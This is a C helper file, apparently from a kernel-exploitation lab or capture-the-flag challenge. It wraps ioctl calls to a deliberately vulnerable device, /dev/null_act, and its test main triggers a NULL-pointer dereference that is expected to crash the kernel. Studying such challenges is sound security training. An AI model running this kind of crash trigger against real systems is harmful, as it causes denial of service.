#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h> // For ioctl
#include <errno.h>   // For errno

// IOCTL 命令号，从 chall1_null_mod.c 中确认
#define NULL_ACT_ALLOC    0x40001
#define NULL_ACT_CALLBACK 0x40002
#define NULL_ACT_FREE     0x40003
#define NULL_ACT_RESET    0x40004

const char *DEVICE_PATH = "/dev/null_act";
static int device_fd = -1; // 使用 static 限制作用域，并通过函数接口访问

// 打开设备文件
int null_act_open() {
    if (device_fd >= 0) {
        //fprintf(stderr, "[!] Device already open (fd: %d).\n", device_fd);
        return device_fd; // 如果已经打开，直接返回 fd
    }
    device_fd = open(DEVICE_PATH, O_RDWR); // 使用 O_RDWR
    if (device_fd < 0) {
        perror("[-] Failed to open /dev/null_act");
        return -1;
    }
    printf("[+] Device /dev/null_act opened successfully (fd: %d).\n", device_fd);
    return device_fd;
}

// 关闭设备文件
void null_act_close() {
    if (device_fd >= 0) {
        if (close(device_fd) < 0) {
            perror("[-] Failed to close /dev/null_act");
        } else {
            printf("[+] Device /dev/null_act closed.\n");
        }
        device_fd = -1;
    }
}

// 内部辅助函数，执行ioctl
static int do_ioctl(unsigned int cmd, const char* cmd_name) {
    if (device_fd < 0) {
        fprintf(stderr, "[-] Device not open. Call null_act_open() first.\n");
        return -1;
    }
    printf("[+] Calling ioctl: %s (0x%x)\n", cmd_name, cmd);
    if (ioctl(device_fd, cmd, NULL) < 0) { // 第三个参数 arg 对于这些命令是 NULL
        char err_msg[100];
        snprintf(err_msg, sizeof(err_msg), "[-] ioctl %s failed", cmd_name);
        perror(err_msg);
        // 对于 callback，失败可能是因为内核崩溃了，所以不一定能打印 perror
        if (cmd == NULL_ACT_CALLBACK) {
            fprintf(stderr, "    (Note: For CALLBACK, failure might indicate a kernel panic if the vulnerability was triggered)\n");
        }
        return -1;
    }
    printf("[+] ioctl %s successful.\n", cmd_name);
    return 0;
}


// 调用 NULL_ACT_ALLOC
int null_act_alloc_op() { // 重命名以避免与宏冲突，并增加 _op 后缀
    return do_ioctl(NULL_ACT_ALLOC, "NULL_ACT_ALLOC");
}

// 调用 NULL_ACT_CALLBACK
int null_act_callback_op() {
    return do_ioctl(NULL_ACT_CALLBACK, "NULL_ACT_CALLBACK");
}

// 调用 NULL_ACT_RESET
int null_act_reset_op() {
    return do_ioctl(NULL_ACT_RESET, "NULL_ACT_RESET");
}

// 调用 NULL_ACT_FREE
int null_act_free_op() {
    return do_ioctl(NULL_ACT_FREE, "NULL_ACT_FREE");
}


/*
 * main 函数在此文件中通常用于测试 operation 函数是否能正确编译和链接。
 * 实际的漏洞触发逻辑在 null_trigger_crash.c 中。
 * 如果这个文件只作为库，main可以移除或注释掉。
 */
#ifdef COMPILE_OPERATIONS_MAIN // 仅当定义此宏时编译 main
int main(void)
{
    printf("This is null_operations.c, testing operations...\n");

    if (null_act_open() < 0) {
        return EXIT_FAILURE;
    }

    if (null_act_alloc_op() != 0) {
        null_act_close();
        return EXIT_FAILURE;
    }

    // 测试一次正常的 callback
    printf("[*] Testing a normal callback call (should not crash)...\n");
    if (null_act_callback_op() != 0) {
        // 如果这里失败，可能是其他问题
    }


    if (null_act_reset_op() != 0) {
        null_act_close();
        return EXIT_FAILURE;
    }

    printf("[*] About to trigger potential crash with NULL_ACT_CALLBACK on NULL item...\n");
    // 这里预期会崩溃
    null_act_callback_op();

    // 如果内核没有崩溃（例如模块修复了漏洞），则会执行到这里
    printf("[*] If you see this, the kernel did not crash as expected after reset.\n");

    null_act_close();
    return EXIT_SUCCESS;
}
#endif // COMPILE_OPERATIONS_MAIN
